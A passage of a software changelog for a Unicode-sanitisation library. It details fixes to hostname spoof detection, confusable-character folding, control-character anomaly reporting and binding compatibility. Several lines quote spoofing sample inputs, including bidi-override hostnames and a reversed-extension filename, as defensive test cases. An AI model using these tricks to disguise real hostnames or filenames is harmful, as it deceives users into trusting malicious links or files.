  **#615 — `canonicalize` cannot cap its way out of an eclipsing mark.** The anti-zalgo
  step is a *count*, and by count one Arabic shadda is indistinguishable from one acute
  accent, so no threshold removes CVE-2017-7833's spoof and keeps `café`. The
  discriminator that works was already in disarm's script data: strip a combining mark
  whose own Script is a *specific* script differing from its base's, and keep `Inherited`
  marks, which attach to anything. That is UTS #39's mixed-script reasoning applied per
  grapheme rather than per string.

  It runs in `canonicalize_strict` **only**. The rule is destructive for scholarly
  transliteration, IPA and linguistic transcription, where marks from one script
  legitimately sit on bases of another — the corpus least able to notice. `canonicalize`
  is deliberately still one short, and there is a test asserting that rather than leaving
  it implied. Verified against nine legitimate samples in five scripts, including Arabic
  *with* its own vowel marks: all pass through completely unchanged.

  The step sits **after** the confusable fold, and that ordering is load-bearing. Placed
  before it, `а` (Cyrillic) + `U+0489` (Cyrillic mark) agrees on the first pass, then the
  fold rewrites the base to Latin `a` and the next pass strips the mark — `f(f(x)) !=
  f(x)`. The property test `canonicalize_strict_idempotent` caught it; deciding against
  the *final* base script is the only stable point.

  `canonicalize_strict` and `strip_obfuscation` now each clear the whole matrix, so
  `TestOneCall`'s guard is inverted rather than deleted: it asserted that closing a gap
  should fail loudly, it did, and it now asserts the two sufficient entry points stay
  sufficient while every other one stays short. The published advice is unchanged and its
  reason has moved — from "nothing suffices" to "the two that suffice are the two most
  destructive ones", which is the same conclusion for a caller who has to forward the
  text they cleaned.


- **`is_suspicious_hostname()` now catches tags, variation selectors, noncharacters
  and PUA, and stops reporting a noncharacter as Arabic (#610).** Third in the
  sequence after #603 (bidi controls) and #605 (zero-width). 17 of 18 sampled
  code points passed the screen clean and **all 18** survived into `canonical`.

  The one that did flag was flagging for the wrong reason, and it is the #605 bug in
  a class #605 did not cover: `U+FDD0` sits in the Arabic Presentation Forms range,
  so the script detector read it as a letter and `paypal<U+FDD0>.evil.com` reported
  `scripts=['Latin', 'Arabic']` with `mixed_script=True`. Widening the existing
  per-label strip fixes that by construction rather than by special case, because
  the strip already runs before `detect_scripts`.

  Reported on the **existing** `has_invisible` field rather than four new ones, so no
  binding payload changes: no new field on the Ruby positional tuple and no change to
  the Java `jni_sig!` string. `is_invisible_in_hostname` composes the four class
  predicates that `src/invisibles.rs` already carried.

  Private use and the variation selectors are included because RFC 5892 puts all four
  of the classes added here in DISALLOWED outright. (The pre-existing zero-width set is
  not uniformly disallowed — `U+200C`/`U+200D` are CONTEXTJ, conditionally permitted —
  and flagging those remains the deliberate fail-closed policy #605 chose, not a reading
  of the RFC.) Both have legitimate uses in ordinary text, so
  a general-text detector needs its own argument for them; that is tracked separately.
  Measured against the full suite including the adversarial-oracle clean corpus: no
  false positives.

  The tag block is the reason this is a security fix rather than tidying.
  `U+E0061`–`U+E007A` spell arbitrary Latin invisibly, and the screen previously
  called such a hostname clean *and* returned the payload intact in `canonical` — the
  combination that turns a detector into a laundering step.

- **`search_key`, `catalog_key` and `sort_key` no longer keep 134 characters that
  `transliterate()` deletes (#602).** A character the table maps to the empty string is
  not *unknown* — it is a decision the table already made, "this has no ASCII form, drop
  it". `ErrorMode::Preserve` was excepting itself from those mappings on the reading that
  an empty mapping is a kind of failure the caller asked to keep, so the three presets
  that pass `Preserve` kept the characters verbatim while
  `TextPipeline(transliterate=True)`, which passes `Ignore`, dropped them correctly.

  `catalog_key` made it worse by running the confusable fold *after* transliteration, so
  a leaked Cyrillic soft sign was folded onto Latin `b`: `Пьеса` became `pbesa`, a key
  containing a letter that appears in neither the input nor its romanisation. It is now
  `pesa`.

  `ErrorMode` still governs what happens to characters the table has nothing to say
  about, so a genuinely unmapped code point is preserved exactly as before. Verified by
  a full-range scan reproducing the issue's own predicate: zero leaks remain.

  One property test asserted that `Preserve` never returns empty output. That held only
  because of the exception removed here, and could not have been true in general — a
  string of nothing but empty-mapped characters legitimately transliterates to nothing,
  which is why its generator already had to exclude combining marks. It is restated as
  the invariant that actually defines the mode: `Preserve` output is never shorter than
  `Ignore` output, which needs no generator exclusions at all.

- **A new `control` anomaly kind — `has_anomalies` goes from 11 CVE rows to 18 (#612).**
  A non-whitespace control (`NUL`, `ESC`, `BEL`, `DEL`, the C1 block) is never
  legitimate in text, and nothing reported one. `strip_control_chars` has removed them
  since #433, so the transform existed and the detector did not.

  The reason they were invisible is worth recording: the introducers are plain ASCII, so
  the ASCII fast path in the token classifier — which exists because the invisible, bidi,
  zalgo and mixed-script branches can only fire above `U+007F` — skipped them entirely.
  The new branch runs before that gate.

  **Presence, not position.** #612 framed this as an "edge" question because it started
  from whitespace trimming, but a control hides things wherever it sits: the last
  character of `"malicious\u001b\\"` is a backslash, so an edge-only rule would call
  that token clean while the escape introducer sits one place in.

  The whitespace-class controls are excluded, reusing `is_fold_whitespace` rather than
  restating the set. TAB, LF, VT, FF, CR, `U+001C`–`U+001F` and NEL are real separators
  that `collapse_whitespace` folds to a space, and flagging them would fire on every
  multi-line string.

  This closes seven rows that `docs/security/cve-validation.md` listed as reported by
  nothing: CVE-2023-24329 (leading NUL) and the whole terminal-control class
  (CVE-2008-2383, CVE-2019-9535, CVE-2025-55754, CVE-2024-52005, CVE-2023-43620,
  CVE-2023-37275). The three that remain undetected are a different shape — a fold
  collision, a length budget, a table lookup — so no further character class will close
  them, and the page now says so.

  Deliberately *not* added: leading/trailing whitespace detection, which #612 also asked
  for. `inspect_anomalies` documents itself as flagging characters "disguising a real
  word", and padding disguises nothing; a kind for it would fire on ordinary text.

- **The Node `AnomalyKind` union shipped without `bidi_mixed`.** It was added to the Rust
  enum in #412 and never mirrored, so a TypeScript caller matching on it got a type error
  for a kind the library really returns. Nothing caught it, because the value crosses
  napi as a bare `String` and `index.ts` casts. Node is the only binding that restates
  the set — every other surface passes it through as a string — so a drift gate now reads
  the `as_str` arms out of `src/anomalies.rs` and compares them to the union, plus a
  second test asserting every kind is reachable from some input.

- **`PRESETS["ml_normalize"]` was missing two of the nine steps it claims to describe
  (#600).** `PRESETS` is a hand-maintained Python mirror of the `const STEPS` arrays in
  `src/presets.rs`; nothing executes it, and it had drifted. The mirror listed seven
  steps, omitting the `transliterate` step and the second `demojize` that #498 added
  after `strip_accents`. `test_preset_steps_exact` did not catch it because it compares
  the mirror against a literal in the test file, and both were written from the same
  wrong reading — so the test pinned the drift instead of detecting it. Mirror and test
  are now correct against Rust.

  `list_profiles()` also said presets are "step-lists defined in Python". They are
  defined in Rust. That sentence is how the drift went unnoticed, so it is corrected
  too, and a comment on `PRESETS` now states what the dict is and what it is not.

  A structural gate that parses the Rust arrays is **not** part of this change: the step
  lists use composite variants (`FixedPoint`, `ConfusablesNfcFixedPoint`) that the
  mirror flattens, so a real gate needs per-preset expansion rules and deserves its own
  issue rather than a fragile parser bolted on here.

- **Documentation: three functions whose names promise more than they check.**
  - `has_bidi_conflict` now says plainly that it is **not** the RLO check (#599). It
    reads letters, so `"invoice\u202Egpj.exe"` returns `False` — the two conditions are
    disjoint and a string can satisfy either, both or neither. The docstrings route to
    `inspect_anomalies` (kind `bidi`) for detection and `strip_bidi` for removal, and
    note that `strip_bidi` does *not* close the real-letter case, because there is no
    format character to remove. `docs/concepts/which-function.md` gains the two bidi rows
    its threat-model table lacked; its only previous mention of bidi was in a *cost*
    column, so the page could not answer "how do I detect a bidi attack".
  - `get_pipeline()` now states that profile names and `PRESETS` keys are disjoint
    namespaces, so `get_pipeline("canonicalize")` raising is expected rather than a bug
    (#600).
  - `ml_normalize`'s documented limits stopped at homoglyphs. They now cover the other
    two: all twelve bidi controls and every PUA code point pass through unchanged (#608).
    `strip_control` handles `Cc`; bidi controls are `Cf`. No behaviour change — the
    preset is tokenizer hygiene, and `llm_guardrail` / `rag_ingest` already exist for
    untrusted input.

- **Python can now call `strip_control_chars` and `strip_zero_width_chars` directly
  (#616).** They already existed in the Rust core (`disarm::api`) and in the C ABI,
  Java/Kotlin, Node and Ruby bindings. Python was the only surface without them, so
  control-stripping there meant constructing a `TextPipeline` rather than calling a
  function — unlike the ten sibling `strip_*` operations, four of which
  (`strip_tags`, `strip_pua`, `strip_noncharacters`, `strip_variation_selectors`) are
  narrower and are plain functions. Both are now exported, and `Text` gains the
  matching fluent methods.

  The parity matrix recorded the gap as deliberate and named the substitute as
  `collapse_whitespace(strip_control=True)` — a signature that has never existed;
  `collapse_whitespace` takes only `text`. That record lived in `PROVIDED_VIA` in
  `scripts/parity.py`, so anyone consulting the matrix for the Python equivalent was
  sent to a `TypeError`. Both entries are removed and the matrix regenerated.

- **`collapse_whitespace` gains a property test covering control characters.** The
  existing `no_leading_trailing_whitespace` property draws from `\PC*`, which
  excludes controls, so the trim invariant was never tested against them. It holds:
  measured exhaustively over the cross product of whitespace, controls and letters
  for lengths 1–4, and over 200,000 random strings, with zero cases where the output
  starts or ends with whitespace. Reported as a trim bug in #612; that report was
  wrong and is retracted there. What looked like a defeated trim is the space
  *between* a leading control and the word, which is interior by the same rule that
  makes `"a\u{0}b"` keep both of its spaces. No behaviour change — the test closes
  the coverage gap that made the question open.

- **`is_suspicious_hostname()` now catches zero-width and invisible characters, and no
  longer reports a phantom script for them (#605).** Sibling of #603, for the characters
  that carry no direction at all — `U+200B`–`U+200D`, `U+2060`–`U+2064`, `U+FEFF` and
  `U+180E`. Eight of the ten passed the screen clean, and **all ten** survived into
  `canonical`.

  The two that did flag were flagging for the wrong reason. `U+FEFF` sits in the Arabic
  Presentation Forms block and `U+180E` in the Mongolian block, so the script detector
  read each as a letter: `paypal<BOM>.evil.com` reported `scripts=['Latin', 'Arabic']`
  and `mixed_script=True`. Right verdict, wrong evidence — and any caller keying policy
  on `scripts` was told an ASCII-looking hostname contained Arabic.

  A new `HostnameAnalysis.has_invisible` reports the finding and is folded into
  `suspicious`. It is additive and disjoint from `bidi_control` (#603). The characters
  are removed **per label, before script analysis**, not on the joined hostname
  afterwards — so `scripts`, `mixed_script`, `has_confusables` and `canonical` are all
  computed on what a reader actually sees, and the phantom-script bug is fixed by
  construction rather than special-cased.

  `U+200C` ZWNJ and `U+200D` ZWJ are flagged unconditionally. IDNA2008 CONTEXTJ permits
  them only in narrow joining contexts that a spoof screen has no reason to honour.

  Exposed across all six surfaces (Rust core, Python, Node, Ruby, Java/Kotlin, C ABI).

- **`is_suspicious_hostname()` now catches bidi control characters, and `canonical` no
  longer carries them (#603).** Every UAX #9 bidi control — the overrides
  `U+202D`/`U+202E`, the embeddings `U+202A`–`U+202C`, the isolates
  `U+2066`–`U+2069` and the marks `U+200E`/`U+200F`/`U+061C` — passed the hostname
  screen clean, `paypal<RLO>moc.evil.com` among them. The verdict was derived entirely
  from `bidi_conflict` (#412), which reads strong-direction **letters** and is
  structurally blind to a format character.

  The ACE path was never affected: `idna::domain_to_unicode` rejects these codepoints
  and the decode failure already failed closed. What slipped through was the
  literal-Unicode label, which reached the pass-through arm uninspected — exactly the
  form a hostname takes in a log line, a mail header or a UI label, where the name never
  resolves and the display spoof is the whole attack.

  Two changes. A new `HostnameAnalysis.bidi_control` field reports the finding and is
  folded into `suspicious`; it is **additive** and disjoint from `bidi_conflict`, whose
  #412 meaning is unchanged (a string can set either, both or neither). And the controls
  are stripped before `canonical` is built, so a caller who screens a hostname and then
  renders that field can no longer render the spoof they were told was absent.

  Exposed across all six surfaces (Rust core, Python, Node, Ruby, Java/Kotlin, C ABI).
  The character set is now defined **once**, in `scripts::is_bidi_control`;
  `presets::is_bidi_or_format` was refactored to build on it rather than keep a second
  copy, so the hostname screen and `strip_bidi` cannot drift apart.

- **`ẞ` uppercases to `SS`, not `B` — German is no longer corrupted (#597).** #595
  recovered `ẞ` (U+1E9E, the capital sharp S — official German orthography since 2017)
  by folding its TR39 prototype `ß` through `ASCII_FOLD` to `b`, then reconciling case.
  That produced `B`, so `STRAẞE` became `STRABE`, `GROẞ` became `GROB` and `FUẞBALL`
  became `FUBBALL`.

  `ß`.to_uppercase() is the two-character `SS`, and that is the right answer: STRAẞE and
  STRASSE are the same word, so folding to `SS` makes them collide — which is what a
  skeleton is for. A genuine multi-character case mapping now wins over `ASCII_FOLD`.
  Two rows move, `ẞ` and `Ꟗ` (Middle Scots S, same prototype). `Ᏸ` U+13F0 is the
  counter-case that keeps the rule honest: a Cherokee letter shaped like `B` with no case
  expansion of its own, so it still folds to `B`.

  `tests/test_accented_latin_fidelity.py` missed this because its German fixture is
  lowercase `Straße`, which was preserved throughout. It now carries the uppercase forms,
  the lowercase asymmetry, and the Cherokee counter-case.

- **Six Latin homoglyphs now fold, and the Latin lambdas collide with the Greek one
  (#593).** `filter_latin_homoglyphs` recovers a Latin-script source whose TR39 prototype
  is a single basic-ASCII graphic. `ASCII_FOLD` runs later, in `generate_mappings`, so a
  row whose prototype that table already knows was discarded before it could be consulted
  — the same shape as #587 and #590: a filter dropping a row before the pass that would
  have made it valid.

  | source | prototype | now |
  |---|---|---|
  | `ẞ` U+1E9E | `ß` | `B` |
  | `Ꟗ` U+A7D6 | `ß` | `B` |
  | `ꞵ` U+A7B5 | `ß` | `b` |
  | `ꝫ` U+A76B | `ȝ` | `z` |
  | `Ꟛ` U+A7DA | `Ʌ` | `A` |
  | `Ƛ` U+A7DC | `Ʌ` | `A` |

  TR39 puts `٨ ۸ Λ Ꟛ` in one confusable class, and the Latin lambdas did not collide with
  the Greek one they are defined to be confusable with — the class had three distinct
  skeletons. It reads `A` throughout now.

  **Two candidates are deliberately excluded.** `ţ` (U+0163) and `ț` (U+021B) reach the
  same prototype, but folding them strips a cedilla and a comma-below; `ț` is ordinary
  Romanian orthography, and `normalize_confusables` promises accented Latin comes through
  intact. The guard tests the source's own canonical decomposition rather than a
  codepoint list, so a future `confusables.txt` cannot smuggle a new accented source past
  it. It applies only to the rows this pass newly recovers: `Ç`, `ç` and `Ǿ` reach a bare
  ASCII prototype only because `strip_combining` removed the mark from TR39's target, and
  they have folded since long before this — #586's fixed-point loop is built on `Ç → C`.

- **Cherokee YE folds to `B`, not `SS` (#593).** `fix_case_mismatch` uppercased the
  prototype before `ASCII_FOLD` could see it, and `ß`.upper() is the two-character `SS`,
  which then escaped the fold because that only fires on a single character. In a table
  about *visual* confusability, `Ᏸ` (U+13F0) is a B-shape. Both call sites now fold to
  ASCII before reconciling case; the blast radius was measured at this one row.

  Latin table 2,183 → 2,189 mappings. The count gate added in #591 caught all five
  documented figures immediately, which is what it was for.

- **The Kotlin extensions keep their published JVM signatures (#588).** A Kotlin default
  argument compiles to one JVM method plus a synthetic `$default` bridge, not to an
  overload per arity. Adding a defaulted parameter therefore *deletes* the signature that
  shipped, and anything compiled against the previous artifact gets `NoSuchMethodError` —
  Java callers, and Kotlin callers that have not been recompiled.

  It had happened twice, unnoticed both times. `dev.disarm:disarm-kotlin:0.13.0` published
  `normalizeConfusables(String, TargetScript)` and `analyzeHostname(String)`; #574 and #562
  each added a default and removed one. #562 made the identical break in the C ABI, where
  it *was* caught and reverted by #580 — the C surface has a committed, drift-gated header
  and this one had nothing.

  All seventeen public extensions with default arguments now carry `@JvmOverloads`, which
  restores both lost signatures and preserves every arity from here on. `JvmSignatureTest`
  is the gate: it reads the compiled facade by reflection rather than the source text, so
  adding a parameter without the annotation turns it red. The policy is recorded in
  `BINDINGS.md`.

  The cost is generated methods rather than maintained ones — `slugify` has twelve
  defaults and emits thirteen arities, taking the facade to 105 public static methods.

- **The `tr39` digit-policy overrides now honour the ASCII contract (#587).** #341 made
  ASCII the contract for the Latin confusable tables. The override set was written later,
  for #561, and never joined it: `write_digit_tr39_overrides` took upstream's raw target
  with only `strip_combining` applied, bypassing the `ASCII_FOLD` pass every value in the
  main table goes through. So `digit_policy="tr39"` put back exactly the residue #341 had
  removed.

  Four of the 46 rows carried a non-ASCII value. Three had a clear ASCII representative
  and now use it:

  | source | TR39 target | now |
  |---|---|---|
  | `٨` U+0668 | `Ʌ` U+0245 | `a` |
  | `۸` U+06F8 | `Ʌ` U+0245 | `a` |
  | `⁰` U+2070 | `º` U+00BA | `o` |

  This was not only cosmetic. TR39 puts `٨ ۸ Λ Ꟛ` in **one** confusable class, and the
  un-folded value made the class stop colliding: `٨` gave `Ʌ`, `Λ` gave `A`, `Ꟛ` gave
  itself. Three skeletons for one class defeats the only thing a skeleton is for. After
  the fix the class reads `a`, `a`, `A`, `Ꟛ` — the digits now collide with the lambda
  case-insensitively. `Ꟛ` (U+A7DA) is still unmapped, for an unrelated reason:
  `filter_latin_homoglyphs` only recovers a Latin-script source whose prototype is basic
  ASCII, and `Ʌ` is not, so that row is dropped before `ASCII_FOLD` is ever consulted.
  That is its own gap, not this one.

  The fourth, `⁹` → `ꝰ` (U+A770 MODIFIER LETTER US), has no clear ASCII representative.
  Rather than ship the residue, the row is dropped and `tr39` falls back to the numeric
  reading for that codepoint, so `⁹` folds to `9` under both policies. The override set
  is 45 rows, every value ASCII, and `build.rs` now asserts it — the assertion the sibling
  table blocks already carried and this one did not.

  The documentation claim is corrected too. Every surface said `tr39` "folds several
  digits to a Latin letter"; three of the 45 rows do not land on a letter — `٠` and `۰`
  fold to `.`, and `𑣣` folds to the two characters `rn`. That is now stated wherever the
  policy is documented, because a caller building a label- or path-shaped key needs to
  know a delimiter can appear.

- **`normalize_confusables` now reaches a fixed point in every binding, not just Python
  (#586).** 0.11.1 shipped #523 as "`normalize_confusables` is now idempotent and complete
  on confusable + combining-mark input". That was true of one of the two call paths.
  #361 had already wired the public Rust API to the single-pass `normalize_confusables_cow`
  a month earlier; #523 added the fixed-point loop to the owned Layer-1 form and its tests,
  and never touched `src/api/safety.rs`. Python reaches the core through the fixed path.
  Rust, Node, Ruby, Java, Kotlin and the C ABI reach it through the other one.

  So the same call answered differently depending on the language, and the non-Python
  answer could still be confusable:

  | Input | Before, outside Python | Python, and now everywhere |
  |---|---|---|
  | `U+04AA U+0327` | `U+0043 U+0327` — `is_confusable` says **true** | `U+0043` |
  | `U+00A5 U+0300` | `U+0059 U+0300` | `U+1EF2` |

  For a primitive whose whole job is producing a skeleton two identifiers can be compared
  on, returning output that the library's own detector still flags is the failure that
  matters. An exhaustive sweep of the BMP crossed with composing marks finds **28** base
  characters affected, not just the two above.

  Layer 1 gains `normalize_confusables_fixed_cow`, the borrowing form of the fixed-point
  fold, and the public API calls it. The owned form now delegates to it rather than
  carrying a second copy of the loop, so there is one implementation to keep correct. The
  borrow-on-no-op guarantee (#352) is unchanged: input with nothing to fold is already a
  fixed point, so the common case still never allocates.

  Guarded at every level: spot cases on the Layer-2 API, parity tests in the Node, Ruby,
  Java, Kotlin and C-ABI suites, and a Tier-3 sweep over the BMP × composing marks for
  both idempotence and residual confusability. The Tier-3 entry is deliberately separate
  from #523's lib-level sweep, because that sweep tests Layer 1 — testing the layer below
  the one the bindings call is how this survived a year.

- **`⁰` and `ᵒ` now fold; a block-range gap had been dropping them (#590).**
  `is_latin_or_common` in `gen_confusables.py` enumerates Latin block ranges and jumps
  from `0x007F` to `0x00C0`, leaving `U+0080–U+00BF` uncovered. `º` (U+00BA) is category
  `Lo` with `Script=Latin` and lives in that hole, so `filter_direct` read it as a
  non-Latin target and discarded both upstream rows pointing at it.

  The symptom was an asymmetry between the only two superscript digits upstream TR39
  carries — it lists visual lookalikes, and no letter resembles a superscript four:

  | | before | now |
  |---|---|---|
  | `⁰` U+2070 | unmapped, passed through | `0` (numeric), `º` (tr39) |
  | `⁹` U+2079 | `9` (numeric), `ꝰ` (tr39) | unchanged |

  `⁹` targets `ꝰ` in Latin Extended-D, so its row survived and the `#89` digit rule
  rewrote it to the ASCII digit. `⁰` was discarded before that rule could run. With the
  row restored, `⁰` gains a `tr39` override too, so the pair is now symmetric.

  The fix admits only the three Latin **letters** in the gap — `ª` `µ` `º` — and gives
  `ASCII_FOLD` the two ordinal indicators, keeping #341's ASCII contract. Opening the
  whole range instead would pull in 58 rows targeting punctuation and symbols (`·`, `°`,
  `¶`, `©`), which is what that contract exists to prevent. `is_latin`, the source-side
  predicate, has the identical gap; closing it there was measured to change nothing,
  since no upstream row uses those three as a source, so it is documented rather than
  changed blind.

  Table sizes move accordingly: Latin 2,181 → 2,183 mappings, `tr39` overrides 45 → 46.
  Every documented count was re-measured against the regenerated tables rather than
  adjusted by hand, which turned up two that were already stale before this change —
  the Latin table was described as `~2,063` mappings (actual 2,183) and the Cyrillic as
  `~1,369` (actual 1,349).

  `tests/test_doc_table_counts.py` existed to prevent exactly that drift, and the two
  files it gates were accurate. The three surfaces carrying the same figure were not
  gated, and had drifted by 118 rows unnoticed: `src/tables/confusables_data.rs`,
  `python/disarm/_api.py`, and the target-script table in the confusables user guide.
  All three are now gated against the same source of truth, taking the check from 5
  figures to 11.

- **Restored the 1-argument `disarm_analyze_hostname` C ABI (#580).** #562 widened it to
  take `contractions`, but that symbol shipped in 0.13.0 and callers are linked against
  the 1-argument form — widening it breaks them at link time. The contraction pass moved
  to a new `disarm_analyze_hostname_opts(host, contractions)`, with the original
  delegating to it, matching `disarm_transliterate` / `_opts` and
  `disarm_normalize_confusables` / `_opts`.

  Found by the header drift gate added in this same change, on its first real run against
  a moved `main` — which is the argument for the gate. Nothing else in CI could see it:
  the smoke test regenerates the header and compiles against it in one step, so a widened
  signature plus a matching call-site change is self-consistent and passes.


- **`sanitize_filename` is now a fixed point on the first pass (#570).** The trailing-dot
  trim ran in `finalize_name`, *after* the extension split it invalidates. Input ending in
  a `.` — literal, or produced by transliteration (`·` U+00B7, `…` U+2026) — had that dot
  taken as the "extension", leaving an earlier dot inside the stem; trimming it then moved
  the boundary, so the next call split elsewhere and stripped a separator that had become
  stem-trailing. `sanitize_filename("a*.b.")` gave `"a_.b"`, then `"a.b"`.

  The trim now runs before the split, so the boundary the split sees is the one the output
  has. `finalize_name` is unchanged and still required — the extension branch re-prepends
  `'.'`, and it owns the empty / `"."` / `".."` fallback.

  The guarantee asserted is stronger than idempotence: a caller sanitizes *once*, so if
  the first pass returned something a second pass would change, the single-pass answer was
  already wrong. Two systems sanitizing a different number of times derived different
  filenames from one input, which defeats dedup on sanitized names.

  Found by the Hypothesis tier, which ran nowhere automatic — see the nightly workflow
  below.

- **Restored a Kotlin test lost in a rebase.** `DisarmKtTest.coverageIntrospection`, added
  with the coverage-introspection API (#563), was silently dropped when that branch was
  rebased through a 14-file conflict. The Kotlin *source* survived, so nothing failed to
  compile and the loss was invisible until the JVM surface was audited for this change.

- **16 confusable rows the generator was silently dropping (#558).**
  `scripts/gen_confusables.py`'s `filter_latin_homoglyphs` pass required the TR39
  prototype to be a single basic ASCII **letter**. That quietly excluded every
  Latin-script letter whose prototype is an ASCII *digit* or *punctuation mark* — `Ʒ`→3,
  `Ȣ`→8, `Ꝯ`→9, `ǃ`→!, `Ɂ`→?, `ꝸ`→&, `꞉`→:, `ꞌ`→' and eight more. Nothing distinguished
  them from the `þ`→`p` / `ſ`→`f` rows already in the table except the category of the
  target, so this was a table gap rather than a policy decision. The predicate is now
  `is_basic_ascii_graphic` and the 16 rows are folded.

  This is the *letter-impersonates-a-digit* direction only. The reverse — a digit source
  folding to a look-alike letter — is still guarded by `enforce_digit_target` (#439);
  `normalize_confusables("०")` remains `"0"`.

  Whitespace is deliberately excluded from the widening: TR39 folds the whole Zs/Zl/Zp
  family to a space, but `collapse_whitespace` already owns that from an explicit
  core-defined set (#433), and a second copy in the confusables table would be a
  divergent duplicate of the whitespace policy.

  The remaining residue is now triaged and written down in
  `docs/provenance.md` rather than inferred: 5 deliberate ASCII
  skeleton divergences, 16 whitespace rows owned elsewhere, and ~4,300 sources whose
  upstream target is non-Latin, for which a to-Latin table is the wrong home.
  `unmapped_confusables()` (#563) makes the split recomputable at any time, so the
  closed gap cannot silently reopen.

### Documentation

- **Documented what the cleaning presets do to non-Latin text, and settled whether the
  confusable fold should be scoped (#624).** `docs/limitations.md` carried the right
  caveat for exactly one destructive step — *designed for security contexts, should not
  be applied to body text* — and the two others never got it. No behaviour changed; what
  changed is that a caller can now find out before pointing one at a sentence.

  Three mechanisms, orthogonal, measured on 13 scripts:

  | | what it does | which samples |
  |---|---|---|
  | `strip_accents` | deletes Indic vowel signs and viramas | Devanagari, Bengali, Tamil, Telugu, Kannada, Malayalam, Gujarati, Khmer |
  | to-Latin confusable fold | splices Latin letters in | Arabic, Persian, Hebrew, Greek, Telugu, Malayalam |
  | format-character strip | removes the ZWNJ Persian requires | Persian |

  A Latin acute and a Devanagari vowel sign are both category `Mn`, so `strip_accents`
  removes both — but in Latin an `Mn` is decoration and in an Indic script it carries the
  vowel. `José` → `Jose` is readable; `বাংলা` → `বল` is not a word. The measurable
  difference is length: removing an accent from precomposed Latin *or Greek* keeps the
  code point count, removing an Indic vowel sign shortens the word.

  **#564's escape hatch does not exist for six of these samples.** For accented Latin a
  caller can reach past the bundle to `normalize_confusables` and keep the accents. For
  Arabic, Persian, Hebrew, Greek, Telugu and Malayalam the *primitive* is the destructive
  step: `العربية` → `lلعربية`, `עברית` → `עבר'ת`, `Ελληνικά` → `Eλλnvikά`, `జ్ఞానం` →
  `జ్ఞానo`. 22 Arabic code points fold to ASCII, 12 Hebrew, 65 Greek.

  **The fold stays unconditional, and that is now a measured decision rather than an open
  question.** The issue asked whether `canonicalize` should fold non-Latin toward Latin at
  all. Skipping the fold when the input contains no Latin looks free — every CVE probe
  that needs it contains Latin — but Latin is the *pivot* alphabet, not the threat. Cyrillic
  `оо` and Greek `οο` contain no Latin, are different strings, and collide only because
  both fold to `oo`. A presence-of-Latin gate would let one impersonate the other.

  Also: `has_anomalies` and `is_mixed_script` are silent on every sample, correctly —
  ordinary Telugu is not an attack — so a screen-then-clean pipeline gets no warning
  first. The *clean unconditionally* rule on the CVE page is now scoped to identifiers,
  hostnames, filenames and log lines, where every row on that page lives.

  `strip_obfuscation`'s docstring already said "non-Latin scripts that have no Latin
  confusable equivalent pass through unchanged", which is true and reads as reassurance
  while excluding exactly the case that bites. It now says what the exclusion covers.
  Caveats added to `strip_accents`, `canonicalize`, `canonicalize_strict` and
  `strip_obfuscation` on both the Rust and Python surfaces.

  Held by `tests/test_non_latin_fidelity.py`, which **derives** the affected sets from
  behaviour rather than listing them — a hand-written list had already gone stale while
  the file was being written, missing that Malayalam's anusvara folds to `o` exactly as
  Telugu's does.

- **`cargo doc` is warning-free again.** Six broken rustdoc links, three of them added by
  #620's `find_key_collisions` — `ErrorKind` is not in scope inside `api`, and
  `MAX_BATCH_SIZE` is `pub(crate)`, so the published docs.rs page had dead links. `cargo doc`
  is not a CI step, which is why nothing caught them. The other three predate #620 and are
  the identical defect (public docs pointing at `crate::hostname::` / `crate::whitespace::`
  private paths instead of the `crate::api::` re-exports); repointed while in the area.

- **The required status checks are named correctly again.** `CONTRIBUTING.md`, `AGENTS.md`
  and `SECURITY.md` told contributors to wait for *"Rust checks passed"* and *"Python
  checks passed"*. #583 collapsed those contexts into a single roll-up, so neither exists:
  branch protection requires **"All checks passed"**, **"DCO sign-off"** and **"iai
  estimated-cycles gate"**. A contributor following the old text waits for a check that
  will never report.

- **The four drift gates are described in one place.** `CONTRIBUTING.md` → *Drift gates*
  now names what each guards and when it fails: the committed `disarm.h` (#580), the 11
  documented row counts in `test_doc_table_counts.py` (#591), the `build.rs` ASCII
  assertions (extended to the `tr39` overrides earlier in this release by #587), and
  `JvmSignatureTest` over the published Kotlin JVM signatures (#588). Each entry names the
  CI check that reports it, so a red run leads straight to the gate. Documentation only —
  no gate changes behaviour here. Two of them read a *build product* rather than
  source text, which is why they catch what source-level assertions miss.

  It also records the habit those gates exist to enforce: when you regenerate a table,
  read the data diff, not just the test output. A generator change can silently *remove*
  rows and leave the suite green — which is how an over-broad filter deleted `Ç → C`
  during #593.

- **The Tier 3 listing matches `tier3.yml` again.** `CONTRIBUTING.md` documented two of
  the five steps the workflow runs; `exhaustive_grapheme` (#174), `exhaustive_confusables`
  (#586) and the lib-level ignored sweep were missing. `AGENTS.md` gained the confusables
  entry and the note on why it is deliberately separate from the Layer-1 sweep.

- **Accented-Latin fidelity is a `strip_obfuscation` property, not a confusables
  property (#564).** `normalize_confusables` preserves accented Latin where
  `strip_obfuscation` destroys it, at identical homoglyph recovery — because
  `strip_accents` sits in the `strip_obfuscation` *bundle*, not in the confusable
  primitive. Nothing in the docs said so, so a reader could reasonably conclude that
  disarm destroys accented Latin as a matter of course, and a benchmark cell measuring
  the bundle could be read as measuring the fold.

  `docs/security/adversarial-defense.md` gains a "What each entry point costs you"
  section: the worked comparison, the structural explanation, and a threat-model →
  entry-point → cost table covering all six entry points. The confusables user guide
  gains the short version with a cross-link. Both are doctested, and
  `tests/test_accented_latin_fidelity.py` pins the claims — including that the loss is
  attributable to `strip_accents` specifically, and that `ml_normalize` folds no
  confusables at any `fold_case` setting, so it is not a homoglyph defence.

  Filed and fixed together with #559 because both have the same shape: a destructive
  step baked into a bundle with no documented route to the non-destructive path.

## [0.13.0] — 2026-08-17

### Added

- **Full `HostnameAnalysis` across the Node, Ruby, and Java/Kotlin bindings (#549).**
  A new `analyzeHostname` / `analyze_hostname` returns the complete analysis
  (verdict + all granular signals, including `whole_script_confusable`) — previously
  those bindings exposed only the `.suspicious` boolean. Node returns a
  `HostnameAnalysis` object, Ruby a Hash, and Java/Kotlin a `dev.disarm.HostnameAnalysis`
  record (the `List<List<String>>` `labelScripts` and `List<Boolean>`
  `labelWholeScriptConfusable` are marshalled directly across the JNI boundary). The
  boolean `isSuspiciousHostname` predicate is unchanged. Mirrors how the anomaly
  report is already exposed. The C-ABI gains the matching structured entry points
  in the same window (see below).
- **Structured reports across the C-ABI (#553).** Five new `#[ffi_export]` entry
  points return their report as a JSON string (freed with the existing
  `disarm_string_free`): `disarm_analyze_hostname` (the full `HostnameAnalysis`,
  including `whole_script_confusable` / `label_whole_script_confusable`),
